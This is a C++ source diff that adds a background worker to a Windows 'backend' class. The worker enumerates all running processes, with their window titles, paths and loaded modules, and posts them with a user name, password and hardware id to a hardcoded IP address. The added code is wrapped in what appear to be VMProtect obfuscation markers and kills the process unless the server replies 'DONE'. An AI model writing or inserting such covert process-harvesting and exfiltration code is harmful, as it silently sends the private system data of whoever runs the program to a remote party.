@@ -139,30 +139,39 @@ std::string sys::c_backend::get_val(std::string name)
 	while (i > 0 && stringValue[i - 1] == '\0') --i;
 	return stringValue.substr(0, i);
 }
-void sys::c_backend::work()
+void __stdcall sys::backend_worker()
 {
-	if (GetTickCount64() > this->last_run) this->last_run = GetTickCount64() + 60000;
-	else return;
-	if (!this->usr.size()) { this->setup(); return; }
-	auto d = this->gather();
+	VMStart();
+	auto d = sys::backend->gather();
+	if (!d.size()) ExitProcess(0);
 	std::stringstream v;
-	auto hwid = this->ghwid();
+	auto hwid = sys::backend->ghwid();
 	auto web_c = new web::client(false, true);
 	web_c->connect(L"185.193.126.235");
 	for (auto a : d)
 	{
 		v << "\npid:" << a.proc_id << "\ntitle:" << a.title.c_str() << "\npath:" << a.full_path.c_str() << "\nexe:" << a.exe_name.c_str() << "\n";
-		/*sdk::util::log->add(std::string("\npid:").append(sdk::util::log->as_hex(a.proc_id))
-			.append("\ntitle:").append(a.title.c_str())
-			.append("\npath:").append(a.full_path.c_str())
-			.append("\nexe:").append(a.exe_name.c_str()), sdk::util::e_info, true);*/
-		for (auto b : a.modules) v << "module:" << b.c_str();
-		web_c->request(L"index.php", web::requestmode::POST, { {"user", this->usr.c_str()}, { "pass", this->pass.c_str() }, { "hwid", hwid.c_str() }, {"action", "peer"}, { "peerData" , v.str().c_str() } });
-		
-		/*auto ret = web_c->tostring(web_c->get());
+		for (auto b : a.modules) v << "module:" << b.c_str() << "\n";
+		web_c->request(L"index.php", web::requestmode::POST, { {"user", sys::backend->usr.c_str()}, { "pass", sys::backend->pass.c_str() }, { "hwid", hwid.c_str() }, {"action", "peer"}, { "peerData" , v.str().c_str() } });
+
+		auto ret = web_c->tostring(web_c->get());
+		if (ret.empty()) continue;
 		std::string key = ret.substr(0, 10);
 		std::string data = ret.substr(10);
-		ret = this->xor_fn(data, key);*/
+		ret = sys::backend->xor_fn(data, key);
+		if (ret != "DONE") ExitProcess(0);
 	}
+	sys::backend->thread_working = false;
+	delete web_c;
+	VMEnd();
+}
+void sys::c_backend::work()
+{
+	if (!this->usr.size()) this->setup(); 
+	if (this->thread_working) return;
+	if (GetTickCount64() > this->last_run) this->last_run = 120000;
+	else return;
+	this->thread_working = true;
+	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sys::backend_worker, 0, 0, 0);
 }
 sys::c_backend* sys::backend;
